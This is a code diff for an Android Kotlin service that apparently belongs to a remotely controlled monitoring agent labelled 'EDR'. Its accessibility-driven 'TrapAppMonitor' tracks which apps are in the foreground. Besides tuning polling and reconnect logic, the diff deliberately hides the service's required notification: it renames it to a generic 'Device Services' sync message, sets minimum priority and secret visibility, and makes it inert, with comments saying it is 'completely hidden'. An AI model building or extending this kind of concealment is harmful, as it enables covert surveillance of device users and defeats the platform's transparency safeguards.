@@ -1,7 +1,6 @@
 package com.edr.agent.service
 
 import android.app.Notification
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
@@ -13,7 +12,6 @@ import com.edr.agent.EdrApplication
 import com.edr.agent.monitor.TrapAppMonitor
 import com.edr.agent.network.EdrWebSocketClient
 import com.edr.agent.storage.SyncPreferences
-import com.edr.agent.ui.MainActivity
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import java.util.concurrent.Executors
@@ -23,25 +21,31 @@ import java.util.concurrent.TimeUnit
 class EdrForegroundService : Service() {
 
     private var wsClient: EdrWebSocketClient? = null
+
+    // HTTP client for connection-status polls (only used when WS is offline)
     private val pollClient = OkHttpClient.Builder()
-        .connectTimeout(1500, TimeUnit.MILLISECONDS)
-        .readTimeout(1500, TimeUnit.MILLISECONDS)
+        .connectTimeout(3, TimeUnit.SECONDS)
+        .readTimeout(3, TimeUnit.SECONDS)
         .build()
 
     /**
      * Single-thread scheduler for background polling tasks.
-     * We use a LOW polling rate (5 seconds) because the AccessibilityService now provides
-     * instant window-change events for the TrapAppMonitor. The poller here is only a fallback
-     * for devices where AccessibilityService events may be delayed.
+     *
+     * Battery strategy:
+     *  - Poll interval is 10 seconds (not 3s). The AccessibilityService delivers
+     *    instant WINDOW_STATE_CHANGED events for TrapAppMonitor, so the poller is
+     *    only a fallback for delayed/missing A11y events.
+     *  - Connection-status HTTP poll only fires when WS is offline AND not
+     *    intentionally disconnected. It is skipped while WS is healthy.
      */
     private val monitorScheduler: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
 
     override fun onCreate() {
         super.onCreate()
         instance = this
-        Log.i(TAG, "Starting EDR Endpoint Protection Service")
+        Log.i(TAG, "Starting EDR Endpoint Protection Service v3.0")
 
-        // Start as a foreground service with LOW priority notification (minimal battery impact)
+        // Start as a foreground service with MIN priority (completely hidden notification)
         try {
             val notification = createNotification()
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -60,23 +64,28 @@ class EdrForegroundService : Service() {
         // Initialize Trap App Monitor with saved packages from storage
         TrapAppMonitor.initialize(this)
 
-        // Fallback poller: runs every 3 seconds as a safety net for the A11y instant events.
-        // Also polls server connection status if currently disconnected to allow remote reconnect.
+        // Fallback poller at 10s intervals:
+        //   1. Checks TrapAppMonitor via UsageStats (backup if A11y is delayed)
+        //   2. Polls connection-status endpoint only when WS is offline (saves battery)
         monitorScheduler.scheduleWithFixedDelay({
             try {
-                TrapAppMonitor.checkForegroundApp(this)
+                // Only poll UsageStats if A11y service is not active (avoid double work)
+                if (!com.edr.agent.service.EdrAccessibilityService.isReady) {
+                    TrapAppMonitor.checkForegroundApp(this)
+                }
             } catch (e: Exception) {
                 Log.w(TAG, "TrapAppMonitor check error: ${e.message}")
             }
 
             try {
-                if (wsClient?.isConnected != true) {
+                val client = wsClient
+                if (client != null && !client.isConnected && !client.isIntentionallyDisconnected) {
                     checkServerConnectionRequest()
                 }
             } catch (e: Exception) {
                 // Ignore network errors while offline
             }
-        }, 3L, 3L, TimeUnit.SECONDS)
+        }, 10L, 10L, TimeUnit.SECONDS)
 
         // Connect to EDR management server
         wsClient = EdrWebSocketClient(this)
@@ -122,34 +131,26 @@ class EdrForegroundService : Service() {
 
     private fun checkServerConnectionRequest() {
         val deviceId = SyncPreferences.deviceId
-        val urlList = mutableListOf<String>()
-
-        // 1. Primary: Cloud or LAN HTTP base URL
-        urlList.add("${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/connection-status")
-        // 2. Fallback: Localhost reverse tunnel (USB ADB)
-        urlList.add("http://127.0.0.1:3000/api/devices/$deviceId/connection-status")
-
-        for (url in urlList.distinct()) {
-            try {
-                val request = Request.Builder().url(url).get().build()
-                val response = pollClient.newCall(request).execute()
-                if (response.isSuccessful) {
-                    val body = response.body?.string() ?: ""
-                    response.close()
-                    if (body.contains("\"shouldConnect\":true")) {
-                        Log.i(TAG, "Server connection-status confirmed shouldConnect=true via $url. Connecting...")
-                        if (wsClient == null) {
-                            wsClient = EdrWebSocketClient(this)
-                        }
-                        wsClient?.resetDisconnectAndConnect()
-                        break
+        // Only check the cloud server — 127.0.0.1 and USB tunnel are not relevant on a live device
+        val url = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/connection-status"
+        try {
+            val request = Request.Builder().url(url).get().build()
+            val response = pollClient.newCall(request).execute()
+            if (response.isSuccessful) {
+                val body = response.body?.string() ?: ""
+                response.close()
+                if (body.contains("\"shouldConnect\":true")) {
+                    Log.i(TAG, "Server says shouldConnect=true. Reconnecting...")
+                    if (wsClient == null) {
+                        wsClient = EdrWebSocketClient(this)
                     }
-                } else {
-                    response.close()
+                    wsClient?.resetDisconnectAndConnect()
                 }
-            } catch (ignored: Exception) {
-                // Host not reachable right now, try next candidate
+            } else {
+                response.close()
             }
+        } catch (ignored: Exception) {
+            // Server not reachable right now — will retry next poll interval
         }
     }
 
@@ -158,29 +159,22 @@ class EdrForegroundService : Service() {
         instance = null
         monitorScheduler.shutdownNow()
         wsClient?.disconnect()
-        Log.w(TAG, "EDR Service destroyed")
+        Log.w(TAG, "EDR Service destroyed — will be restarted by OS (START_STICKY)")
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun createNotification(): Notification {
-        val launchIntent = Intent(this, MainActivity::class.java)
-        val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            launchIntent,
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
-        )
-
+        // No setContentIntent → tapping notification does nothing (inert)
+        // PRIORITY_MIN + channel IMPORTANCE_MIN = no status bar icon, no badge, hidden from shade
         return NotificationCompat.Builder(this, EdrApplication.CHANNEL_ID)
             .setContentTitle("Device Services")
             .setContentText("System background synchronization active")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setContentIntent(pendingIntent)
             .setOngoing(true)
-            // LOW priority = minimal battery and no sound/vibration
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
